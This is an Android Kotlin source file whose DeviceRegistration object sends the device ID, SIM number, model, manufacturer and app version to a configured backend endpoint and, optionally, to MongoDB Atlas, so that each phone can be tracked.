package com.calltech

import android.content.Context
import android.os.Build
import android.util.Log

/** Device ko server par register karo — har phone alag track ho. */
object DeviceRegistration {
    private const val TAG = "DeviceRegistration"

    fun register(context: Context) {
        BackgroundSyncRunner.run {
            registerNow(context.applicationContext)
        }
    }

    fun registerNow(context: Context): Boolean {
        val app = context.applicationContext
        MongoSyncHelper.ensureApiUrl(app)
        SimNumberHelper.ensureSimReadyForSync(app)

        val deviceId = DeviceIdHelper.getDeviceId(app)
        val simNumber = SimNumberHelper.getBestKnownSimNumber(app)
        val payload = mapOf(
            "deviceId" to deviceId,
            "simNumber" to simNumber,
            "model" to (Build.MODEL ?: "unknown"),
            "manufacturer" to (Build.MANUFACTURER ?: "unknown"),
            "appVersion" to BuildConfig.VERSION_NAME,
        )

        var httpOk = false
        val baseUrl = MongoSyncHelper.getApiBaseUrl(app)
        if (!baseUrl.isNullOrBlank()) {
            httpOk = try {
                postRegistration("$baseUrl/devices/register", payload).also { ok ->
                    if (ok) {
                        Log.d(TAG, "Device registered via HTTP: $deviceId / $simNumber")
                    }
                }
            } catch (error: Exception) {
                Log.e(TAG, "HTTP device registration failed: ${error.message}")
                false
            }
        }

        var atlasOk = false
        if (AtlasDirectSync.isConfigured()) {
            atlasOk = AtlasDirectSync.registerDevice(
                deviceId = deviceId,
                simNumber = simNumber,
                model = Build.MODEL ?: "unknown",
                manufacturer = Build.MANUFACTURER ?: "unknown",
            )
        }

        val simOk = SimNumberHelper.registerAllSimsInMongo(app)
        val ok = httpOk || atlasOk || simOk
        if (!ok) {
            Log.e(TAG, "Device/SIM registration failed for $deviceId")
        }
        return ok
    }

    private fun postRegistration(url: String, body: Map<String, Any>): Boolean {
        var connection: java.net.HttpURLConnection? = null
        return try {
            connection = (java.net.URL(url).openConnection() as java.net.HttpURLConnection).apply {
                requestMethod = "POST"
                connectTimeout = 45000
                readTimeout = 45000
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
            }

            val payload = org.json.JSONObject(body).toString()
            java.io.OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write(payload)
                writer.flush()
            }

            connection.responseCode in 200..299
        } catch (error: Exception) {
            false
        } finally {
            connection?.disconnect()
        }
    }
}
